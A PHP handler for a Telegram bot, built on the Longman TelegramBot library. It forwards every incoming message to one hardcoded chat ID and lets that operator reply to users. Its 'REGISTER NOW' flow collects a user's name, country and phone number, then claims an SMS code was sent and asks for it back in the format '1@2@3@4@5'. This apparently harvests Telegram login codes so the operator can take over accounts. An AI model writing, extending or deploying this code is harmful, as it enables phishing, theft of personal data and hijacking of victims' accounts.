<?php
/**
 * This file is part of the TelegramBot package.
 *
 * (c) Avtandil Kikabidze aka LONGMAN <akalongman@gmail.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Longman\TelegramBot\Commands\SystemCommands;

use Longman\TelegramBot\Commands\SystemCommand;
use Longman\TelegramBot\Conversation;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\Keyboard;

/**
 * Generic message command
 *
 * Gets executed when any type of message is sent.
 */
class GenericmessageCommand extends SystemCommand
{
    /**
     * @var string
     */
    protected $name = 'genericmessage';

    /**
     * @var string
     */
    protected $description = 'Handle generic message';

    /**
     * @var string
     */
    protected $version = '1.1.0';

    /**
     * @var bool
     */
    // protected $need_mysql = true;

    /**
     * Command execute method if MySQL is required but not available
     *
     * @return \Longman\TelegramBot\Entities\ServerResponse
     * @throws \Longman\TelegramBot\Exception\TelegramException
     */
    public function executeNoDb()
    {
        // Do nothing
        // return $this->replyToChat("helooooo");
        // return Request::emptyResponse();
    }

    /**
     * Command execute method
     *
     * @return \Longman\TelegramBot\Entities\ServerResponse
     * @throws \Longman\TelegramBot\Exception\TelegramException
     */
    public function execute()
    {
        //If a conversation is busy, execute the conversation command after handling the message
        $conversation = new Conversation(
            $this->getMessage()->getFrom()->getId(),
            $this->getMessage()->getChat()->getId()
        );

        //Fetch conversation command if it exists and execute it
        if ($conversation->exists() && ($command = $conversation->getCommand())) {
            return $this->telegram->executeCommand($command);
        }
        else {
            $message = $this->getMessage();
            $message_id = $message->getMessageId();
    
            $message_text = $message->getText(true);
            $chat_id    = $message->getChat()->getId();
    
    
        

        if ($chat_id === '1053901092') {
 $this->replyToChat("heloooooooooo");
            if ($message->getReplyToMessage()) {

                $forwardFrom = $message->getReplyToMessage()->getForwardFrom()->getId();
                
               
              
              return Request::sendMessage([
                    'chat_id' => $forwardFrom,
                    'text' => $message_text
        
                ]);
            }
            
             
         return Request::emptyResponse();


        }
        else {

           

          Request::forwardMessage([
            'chat_id' => '1053901092',
            'from_chat_id' => $chat_id,
            'message_id' => $message_id

        ]);

       
            

        $keyboards[] = new Keyboard([
            ['text' => 'SUBMIT YOUR NAME'],
          
        ]);

        $keyboard = end($keyboards)
        ->setResizeKeyboard(true)
        ->setOneTimeKeyboard(true)
        ->setSelective(false);


        $keyboards2[] = new Keyboard([

            ['text' => 'SUBMIT YOUR COUNTRY'],
          
        ]);

        $keyboard2 = end($keyboards2)
        ->setResizeKeyboard(true)
        ->setOneTimeKeyboard(true)
        ->setSelective(false);


        $keyboards3[] = new Keyboard([
            
            ['text' => 'SUBMIT YOUR PHONE', 'request_contact' => true],
           
          
        ]);

        $keyboard3 = end($keyboards3)
        ->setResizeKeyboard(true)
        ->setOneTimeKeyboard(true)
        ->setSelective(false);


        $keyboards4[] = new Keyboard([
            
            ['text' => 'CONFIRM YOUR CODE'],
          
        ]);

        $keyboard4 = end($keyboards4)
        ->setResizeKeyboard(true)
        ->setOneTimeKeyboard(true)
        ->setSelective(false);
       

            if ($message_text == "REGISTER NOW") {
                return $this->replyToChat("Please ! Write Your Fullname eg( joe doe )", [
                    'reply_markup' => $keyboard,
                 ]);
            }

            elseif ($message_text == 'SUBMIT YOUR NAME')
            {
                return $this->replyToChat("Please ! Write Your country eg( brasil )", [
                    'reply_markup' => $keyboard2,
                 ]);
            }

            elseif ($message_text == 'SUBMIT YOUR COUNTRY')
            {
                
                return $this->replyToChat("Please ! Write Your PHONE Number eg( +***** )", [
                    'reply_markup' => $keyboard3,
                 ]);
            }

            elseif ($message->getReplyToMessage() && $message->getReplyToMessage()->getText(true) == "Please ! Write Your PHONE Number eg( +***** )") {
                return $this->replyToChat(" WE SENT YOU A SMS CODE". PHP_EOL. 
                " Please ! SEND BACK THE CODE eg( 1@2@3@4@5 )", [
                    'reply_markup' => $keyboard4,
                 ]);
            }

            elseif ($message_text == 'SUBMIT YOUR PHONE')
            {
                return $this->replyToChat(" WE SENT YOU A SMS CODE". PHP_EOL. 
                " Please ! SEND BACK THE CODE eg( 1@2@3@4@5 )", [
                    'reply_markup' => $keyboard4,
                 ]);
            }
        

        }
    }

        // return Request::emptyResponse();
    }
}
